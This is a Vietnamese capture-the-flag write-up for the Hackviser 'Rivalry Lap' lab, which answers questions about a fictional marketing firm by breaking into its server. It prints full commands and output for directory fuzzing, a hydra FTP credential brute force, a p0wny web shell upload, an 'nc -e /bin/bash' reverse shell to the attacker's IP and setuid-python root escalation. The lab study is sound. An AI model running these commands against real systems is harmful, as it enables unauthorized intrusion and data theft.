---
title: "Rivalry Lap"
published: 2025-09-19
description: "Bài này khá là hay."
tags: [CAPT, Hackviser]
category: Write up
draft: false
---

# **Rivalry Lap**
## How many new clients does the CEO of Orbitronix Systems, Emily Johnson, claim they have gained?
- truy cập trang web tôi thấy được giới thiệu ở gần cuối trang rằng **"CreateEdge's strategies gained us 3500 new customers in just a few months!"**
==> điều đó cho biết được rằng đáp án là **3500**

---
## What is the advertising budget of Orbitronix Systems in dollars?
- Thử dùng công cụ ffuf để quét thư mục , tôi phát hiện được 1 thư mục có tên **ftp**
```
 ffuf -ic-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e '.php'-u http://createdge.hv/FUZZ/ -t 40

     /'___\  /'___\           
   /\ \__/ /\ \__/  __  __  /\ \__/       
   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
    \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
     \ \_\ \ \_\ \ \____/  \ \_\          
      \/_/  \/_/  \/_/___/   \/_/          
v2.1.0-dev
 ________________________________________________
:: Method           : GET        
:: URL              : http://createdge.hv/FUZZ/       
:: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list     
2.3-medium.txt
:: Extensions       : .php 
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10   
:: Threads          : 40   
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 .php                     [Status: 200, Size: 10752, Words: 3217, Lines: 272, Duration: 188ms]
 icons                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 183ms]
 assets                   [Status: 200, Size: 1501, Words: 100, Lines: 20, Duration: 182ms]
 ftp                      [Status: 200, Size: 935, Words: 62, Lines: 17, Duration: 182ms]

```
- Truy cập vào thư mục ta thấy được 1 file **clients.csv** . Tải nó về và mở ra thì có nội dung là :
```
Company Name,Advertising Budget ($)
Innovatech Ltd,50000
QuantumSoft,75000
BlueHaven Tech,60000
PinnacleByte,45000
SysTech Global,80000
Orbitronix Systems,225000
NexaCore Tech,30000
Zenithar Tech,70000
VortexaTech,55000
NovaSphere Tech,65000

```
==> đáp án là **225000**

---
## Who is the target audience of the Orbitronix Systems advertising campaign?
- Tôi quét mục tiêu bằng công cụ nmap thì phát hiện có bật cổng dịch vụ ftp trên port 21
- Sau đó tôi đã dùng công cụ hydra để quét các cặp tài khoản mật khẩu dễ bị xâm phạm 
```
┌─[✗]─[root@hackerbox]─[~]
└──╼ #hydra -f -V -I -t 4 -s 21 -C /root/Desktop/misc/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 172.20.22.208 ftp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-19 08:52:24
[DATA] max 4 tasks per 1 server, overall 4 tasks, 66 login tries, ~17 tries per task
[DATA] attacking ftp://172.20.22.208:21/
[ATTEMPT] target 172.20.22.208 - login "anonymous" - pass "anonymous" - 1 of 66 [child 0] (0/0)
[ATTEMPT] target 172.20.22.208 - login "root" - pass "rootpasswd" - 2 of 66 [child 1] (0/0)
[ATTEMPT] target 172.20.22.208 - login "root" - pass "12hrs37" - 3 of 66 [child 2] (0/0)
[ATTEMPT] target 172.20.22.208 - login "ftp" - pass "b1uRR3" - 4 of 66 [child 3] (0/0)
[ATTEMPT] target 172.20.22.208 - login "ftp_boot" - pass "ftp_boot" - 48 of 66 [child 0] (0/0)
[ATTEMPT] target 172.20.22.208 - login "uploader" - pass "ZYPCOM" - 49 of 66 [child 1] (0/0)
[ATTEMPT] target 172.20.22.208 - login "ftpuser" - pass "password" - 50 of 66 [child 2] (0/0)
[ATTEMPT] target 172.20.22.208 - login "USER" - pass "USER" - 51 of 66 [child 3] (0/0)
[21][ftp] host: 172.20.22.208   login: ftpuser   password: password
[STATUS] attack finished for 172.20.22.208 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-19 08:52:36

```
==> Thấy được công cụ đã quét được tài khoản mật khẩu để đăng nhập dịch vụ ftp là **ftpuser:password**
- Đăng nhập vào dịch vụ ftp 
```
ftp 172.20.22.208
```
- Tôi đã tạo 1 file web shell ở [đây](https://github.com/flozz/p0wny-shell) , sau đó tôi tải nó lên sever web
```
put shell.php
```
- Quay trở lại shell tôi cấu hình lắng nghe trên cổng 8888
```
nc -lvp 8888
```
- Sau đó tôi truy cập file shell trên trình duyệt và chạy câu lệnh
```
www-data@debian:/# nc -e /bin/bash 172.20.22.91 8888
```
- Khi có được shell , tôi đã chạy python để có được 1 shell chỉnh chu và đẹp mắt hơn
```
python3 -c 'import os; os.system("/bin/bash")'
```
---
- Dùng find để tìm kiếm file thực thi có setuid được bật để tìm kiếm cơ hội leo thang đặc quyền .
```
find / -perm -4000 2>/dev/null
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/python3.9
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
- python3.9 có bật setuid là 1 lỗ hỏng có thể leo thang đặc quyền .
```
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
- Khi đã có root tôi truy cập vào đường dẫn /archive/detailed_client_info.csv
, nội dung của file này là:
```
Company Name,Advertising Budget ($),Campaign Objective,Campaign Success,Target Audience,Campaign Duration (Months)
Innovatech Ltd,50000,Customer Retention,Yes,Long-term Customers,6
QuantumSoft,75000,Sales Increase,No,Professionals,3
BlueHaven Tech,60000,Product Launch,Yes,Tech Enthusiasts,4
PinnacleByte,45000,Market Expansion,Yes,Global Market,5
SysTech Global,80000,Online Engagement,No,Online Shoppers,2
Orbitronix Systems,225000,Brand Awareness,Yes,Young Adults,12
NexaCore Tech,30000,Brand Awareness,No,Youth,7
Zenithar Tech,70000,Sales Increase,Yes,B2B Clients,1
VortexaTech,55000,Market Expansion,No,Local Market,8
NovaSphere Tech,65000,Product Launch,Yes,Innovators,9
```
==> đáp án cho câu hỏi này là : **Young Adults**

---

## What is the name of the secret marketing tool developed by Create Edge?

- Tiếp tục đọc nội dung của file /archive/meetings/orbitronix_system-2023-11-20.txt thấy được đoạn nội dung này :
```
Meeting Notes: Create Edge - Orbitronix Systems
Date: 2023-11-20
Location: Create Edge Headquarters

Attendees:
- Alex Carter (Create Edge, Marketing Director)
- Sophia Reynolds (Orbitronix Systems, Senior Project Manager)

Agenda:
1. Introduction and objectives of the meeting.
2. Discussion on current market trends and consumer behavior.
3. Overview of Orbitronix Systems' marketing goals.
4. Create Edge's proposed marketing strategies for Orbitronix Systems.
5. Budget considerations and timelines.
6. Q&A and next steps.

Key Points Discussed:
- Orbitronix Systems is seeking to enhance its brand visibility and customer engagement.
- Create Edge presented a comprehensive digital marketing strategy, focusing on social media and content marketing.
- Discussed the importance of SEO and online presence for Orbitronix Systems.
- Budget allocation for the campaign was tentatively agreed upon, subject to approval by Orbitronix Systems' finance department.
- Proposed timeline for the marketing campaign rollout is 12 months, starting from February 2024.

Secret and Highly Important Information:
- Alex Carter revealed that Create Edge has developed a groundbreaking AI-driven marketing analysis tool,which name is InsightNexus AI, which they plan to implement for the first time in the Orbitronix campaign.
- Sophia Reynolds mentioned a potential merger between Orbitronix Systems and another major tech player, which could significantly shift the market dynamics.

Action Items:
- Create Edge to send a detailed proposal to Orbitronix Systems by 2024-01-27.
- Orbitronix Systems to review and provide feedback on the proposal by 2024-02-03.
- Schedule a follow-up meeting to finalize the campaign details.

Meeting concluded at 3:30 PM.
```
==> Qua đoạn hội thoại trên ta thấy được đáp án chính là : **InsightNexus AI**


